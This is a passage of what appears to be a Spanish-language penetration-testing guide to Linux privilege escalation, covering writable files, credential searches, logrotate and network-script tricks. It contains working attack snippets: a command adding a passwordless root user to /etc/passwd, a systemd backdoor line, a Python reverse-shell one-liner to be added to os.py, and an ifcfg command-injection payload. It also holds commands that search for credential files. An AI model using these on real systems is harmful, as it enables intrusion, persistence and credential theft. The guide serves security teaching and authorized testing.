Ahora puedes usar el comando `su` con `hacker:hacker`

Como alternativa, puedes usar las siguientes líneas para añadir un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías reducir la seguridad actual de la máquina.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTA: En plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`; además, `/etc/shadow` cambia de nombre a `/etc/spwd.db`.

Deberías comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de servicios**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Por ejemplo, si la máquina ejecuta un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Revisar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Ubicación extraña/Archivos propios

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Archivos modificados en los últimos minutos

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Archivos de bases de datos SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

En bases de datos de aplicaciones que se puedan leer, inspecciona los nombres de tablas y columnas en busca de nombres de usuario y hashes de contraseñas. Encontrar un hash, recuperar su contraseña y demostrar que se reutiliza en una cuenta local son pasos independientes; una cadena hexadecimal genérica de 32 caracteres no basta para deducir que sea MD5 ni que permita acceder a una cuenta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml archivos

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Si un historial de shell legible contiene un comando `sudo` seguido de una línea corta con aspecto de contraseña, inspecciona manualmente las líneas cercanas. Una contraseña introducida en el prompt normal de `sudo` no se guarda en el historial de shell; una línea posterior solo podría ser una entrada accidental en la shell, no una prueba de que la contraseña sea válida. El marcador `.sudo_as_admin_successful` registra un uso anterior, no la autorización actual.

### Archivos ocultos

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/Binarios en PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Archivos web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Copias de seguridad**

Inspecciona los archivos legibles dentro de los directorios de copias de seguridad, así como los archivos cuyos **nombres** contengan `backup`: un archivo comprimido con un nombre opaco o una extensión cifrada aún puede exponer datos antiguos de aplicaciones. Un archivo comprimido cifrado es solo un posible caso de exposición. La recuperación de la contraseña, la inspección de su contenido, la recuperación de un hash de aplicación y la reutilización de esa contraseña para una cuenta Unix son pasos distintos que deben verificarse; un hash en un archivo comprimido no demuestra que exista un inicio de sesión local.

Las copias de seguridad legibles de máquinas virtuales merecen la misma revisión. Una configuración `.vbox` de VirtualBox puede identificar imágenes `.vdi` conectadas e incluir metadatos de claves de disco cifradas; [VirtualBox documenta que la clave de datos cifrada se almacena en la configuración de la máquina virtual](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Tanto la configuración como la imagen deben ser accesibles para poder revisar el disco sin conexión. Un volumen del sistema invitado puede tener su propia [capa de cifrado LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), que requiere una clave independiente. Incluso después de un descifrado autorizado, los scripts o archivos de configuración antiguos pueden contener una contraseña; verifica que la credencial siga siendo válida para una cuenta del host y que su política efectiva de `sudo` permita ejecutar un comando privilegiado antes de considerar esto una escalada local. Durante la enumeración pasiva, registra las rutas y los permisos sin copiar, descifrar ni montar imágenes.

Al inspeccionar un archivo comprimido legible, primero lista los nombres de sus elementos antes de extraer nada: puede contener archivos de autenticación ocultos, material con códigos de recuperación o claves SSH, aunque las copias activas estén protegidas. Los nombres de archivo solo indican una posible pista; verifica el material y cualquier reutilización de cuentas por separado.

Da prioridad a los **archivos comprimidos legibles que pertenezcan a otro usuario** dentro de los directorios de copias de seguridad, en especial los que pertenezcan a root y aquellos a los que se pueda acceder mediante la pertenencia a un grupo. Un archivo antiguo puede contener una configuración o un secreto de autenticación aunque la copia activa esté protegida. Para una interfaz de copias de seguridad local como [Backrest](https://garethgeorge.github.io/backrest/), comprueba la cuenta efectiva del servicio y si un usuario con menos privilegios puede leer su configuración o autenticarse en la interfaz. Sus [hooks](https://garethgeorge.github.io/backrest/docs/hooks) y su [interfaz de comandos de restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) pueden operar con los privilegios de archivos y comandos del daemon; que escuche solo en una interfaz loopback no determina por sí solo el impacto. `passwordBcrypt` de Backrest es un hash bcrypt codificado en base64 en su [código de autenticación](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), no una contraseña en texto plano. Confirma la identidad del servicio, la existencia de credenciales utilizables y el acceso al plan o repositorio pertinente antes de considerar un archivo comprimido o una interfaz expuestos como un límite de privilegios.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para ello es [**LaZagne**](https://github.com/AlessandroZ/LaZagne), una aplicación de código abierto que se utiliza para recuperar muchas contraseñas almacenadas en un equipo local con Windows, Linux o Mac.

Si puedes leer `/etc/guacamole/guacamole.properties`, revisa sus ajustes de conexión a bases de datos `mysql-*`, `postgresql-*` o `sqlserver-*`. Si la cuenta tiene autorización para leer las tablas JDBC de Guacamole, `guacamole_connection_parameter` puede contener valores guardados de `username`, `password`, `private-key` o `passphrase` de SSH. Empieza por los ID de conexión y los nombres de los parámetros, y luego inspecciona solo las filas pertinentes; un valor guardado podría ser un token dinámico o una referencia a un vault, en lugar de un secreto reutilizable. Consulta el [esquema JDBC de Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) y los [parámetros de conexión SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

El [gestor de contraseñas pswm](https://github.com/Julynx/pswm#usage) almacena por defecto un vault cifrado en `~/.local/share/pswm/pswm`. Si puedes ver el vault de otro usuario, comprueba quién es su propietario y si tu cuenta realmente puede leerlo. La ruta del vault por sí sola no revela credenciales; recuperar su contraseña maestra, encontrar una contraseña de cuenta reutilizable y confirmar los privilegios de esa cuenta son pasos independientes.

La [base de datos predeterminada de Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) es `~/.passpie/`, con un llavero `.keys` y archivos de credenciales cifrados `.pass` dentro de directorios de grupos. Que un directorio de base de datos sea visible solo indica una posible ruta: confirma que puedes acceder a la clave y a la entrada cifrada pertinente, si se requiere una frase de contraseña maestra y si la credencial recuperada pertenece a una cuenta con más privilegios. Passpie también permite [rutas de bases de datos personalizadas](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), por lo que la ruta predeterminada no es exhaustiva. La enumeración automatizada debe listar metadatos sin exportar credenciales ni mostrar material de claves.

### Registros

Si puedes leer los registros, quizá encuentres **información interesante o confidencial en ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos **registros de auditoría** mal configurados (¿con backdoor?) podrían permitirte **registrar contraseñas** dentro de los registros de auditoría, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Para **leer logs**, el grupo [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) será muy útil.

### Archivos de shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Búsqueda genérica de credenciales/Regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro del **contenido**, y buscar IPs y emails en los logs, o regexps de hashes.\
No voy a enumerar aquí cómo hacer todo esto, pero si te interesa puedes revisar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos escribibles

### Python library hijacking

Si sabes **desde dónde** se va a ejecutar un script de Python y **puedes escribir dentro** de esa carpeta o puedes **modificar las librerías de Python**, puedes modificar la librería del SO y añadirle un backdoor (si puedes escribir en la ubicación desde la que se ejecutará el script de Python, copia y pega la librería os.py).

Para **añadir un backdoor a la librería**, solo tienes que agregar al final de la librería os.py la siguiente línea (cambia IP y PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Explotación de logrotate

Un trabajo de `logrotate` con privilegios puede crear una ruta de escritura de archivos entre usuarios cuando rota un registro ubicado debajo de un directorio que un usuario con menos privilegios puede reemplazar o redirigir durante la rotación. Que un registro sea escribible es solo una pista. Confirma la regla activa exacta y sus directivas `create`, `olddir` y `su`; la identidad efectiva del planificador; los permisos de escritura y búsqueda en el directorio padre del registro; y si la compilación y la política instaladas permiten cambiar el destino. Además, un shell posterior con privilegios debe cargar el archivo resultante para que la escritura de un archivo de inicio se convierta en ejecución de comandos. Inspecciona la programación, la regla, la versión y el empaquetado, y los metadatos de la ruta, sin provocar una rotación ni intentar la carrera.

> [!TIP]
> No consideres `3.18.0` ni ninguna cadena de versión, por sí sola, un límite de explotabilidad. El [registro de cambios de upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) documenta medidas de protección para directorios y symlinks en varias versiones, y las distribuciones pueden retroportar correcciones. El [manual de upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recomienda usar `su` cuando root rota registros en directorios controlados por usuarios sin privilegios; verifica la regla efectiva y el comportamiento real.

Puedes encontrar información más detallada sobre la vulnerabilidad en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(registros de nginx)**, así que, siempre que descubras que puedes modificar registros, comprueba quién los administra y si puedes escalar privilegios sustituyendo los registros por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Un archivo `ifcfg-*` es una pista para revisar cuando un usuario con menos privilegios puede crearlo o modificarlo **y** una ruta privilegiada de activación de red leerá ese archivo exacto. Confirma los permisos efectivos del archivo y del directorio, la interfaz seleccionada, la implementación instalada de `ifup`/`ifdown` y quién la invoca. Que un archivo sea escribible no provoca ejecución por sí solo. La [guía de redes de RHEL 7 de Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue los scripts de red heredados de NetworkManager: este último no activa por sí mismo los primeros. La [documentación de RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) indica que sus comandos `ifup`/`ifdown` predeterminados usan NetworkManager, mientras que el paquete heredado opcional proporciona scripts de shell.

En un sistema que realmente use scripts heredados con privilegios, una asignación `ifcfg-*` sin comillas y procesada como código de shell, como `NAME=`, puede cruzar un límite de ejecución de código. Verifica el parser exacto, el valor y la ruta de activación; no deduzcas que se interpreta como shell por el nombre del archivo ni por la presencia de NetworkManager. Un wrapper permitido por sudo que escriba la entrada del usuario en un archivo `ifcfg-*` y luego invoque el `ifup` heredado constituye otra ruta hacia este límite, incluso cuando el usuario no puede editar directamente el archivo.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Nota el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` contiene **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y, en ocasiones, `reload` servicios. Estos se pueden ejecutar directamente o mediante enlaces simbólicos en `/etc/rc?.d/`. En los sistemas Redhat, la ruta alternativa es `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un sistema más reciente de **gestión de servicios** introducido por Ubuntu que utiliza archivos de configuración para las tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit siguen utilizándose junto con las configuraciones de Upstart gracias a una capa de compatibilidad de Upstart.

**systemd** es un gestor moderno de inicialización y servicios que ofrece funciones avanzadas, como el inicio de daemons bajo demanda, la gestión de automount y las instantáneas del estado del sistema. Organiza los archivos en `/usr/lib/systemd/` para los paquetes de la distribución y en `/etc/systemd/system/` para las modificaciones del administrador, lo que simplifica la administración del sistema.<sup>[[21]](#references)</sup>

## Otros trucos

### Escalada de privilegios mediante NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escapar de shells restringidas


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworks de rooting de Android: abuso del canal del manager

Los frameworks de rooting de Android suelen interceptar una syscall para exponer funciones privilegiadas del kernel a un manager en el espacio de usuario. Una autenticación débil del manager (p. ej., comprobaciones de firma basadas en el orden de los FD o esquemas de contraseña deficientes) puede permitir que una aplicación local suplante al manager y escale a root en dispositivos que ya tienen root. Aquí encontrarás más información y detalles de explotación:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Detección del servicio VMware Tools y LPE (CWE-426) mediante exec basado en regex (CVE-2025-41244)

La detección de servicios basada en regex en VMware Tools/Aria Operations puede extraer una ruta de binario de las líneas de comando de los procesos y ejecutarlo con -v en un contexto privilegiado. Los patrones permisivos (p. ej., el uso de \S) pueden coincidir con listeners preparados por un atacante en ubicaciones con permisos de escritura (p. ej., /tmp/httpd), lo que puede provocar la ejecución como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Aquí encontrarás más información y un patrón generalizable a otros stacks de detección y monitorización:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protecciones de seguridad del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Herramientas de privesc para Linux/Unix

### **Mejor herramienta para buscar vectores de escalada de privilegios local en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opción -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y Mac [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (escalada de privilegios mediante la interfaz de crontab, reutilización de credenciales con zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig falsificado para un monitor ejecutado por cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: bypass de Neighborhood Watch (secuestro de PATH mediante sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalada básica de privilegios en Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guía de escalada de privilegios en Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Ataque y defensa: técnicas de escalada de privilegios en Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [¡Nadie espera la ejecución de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalada de privilegios en Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guía de los ejercicios del laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: consejos y trucos para la escalada de privilegios en Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: herramienta de enumeración y escalada de privilegios para Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [¿Qué es un socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Acceder al D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Escalada de privilegios en Linux mediante ejecutables SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, parte 2: escalada de privilegios en Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Cómo gestionar ACL en Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Obtener root en Redhat/CentOS mediante network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [¿Qué es systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (inyección aritmética de bash mediante logs, cadena completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manual de GNU Bash – BASH_ENV (archivo de inicio no interactivo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + escalada de privilegios mediante symlink TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia de pg_basebackup mediante cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Tú lo nombras, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalada de privilegios mediante Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilidades de escalada de privilegios de Sudo CVE-2025-32462 y CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Directorios de repositorio PYC](https://peps.python.org/pep-3147/)
- [32] [Documentación de Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit, issue n.º 74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registro de contraseñas en Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Detalles de una condición de carrera de logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
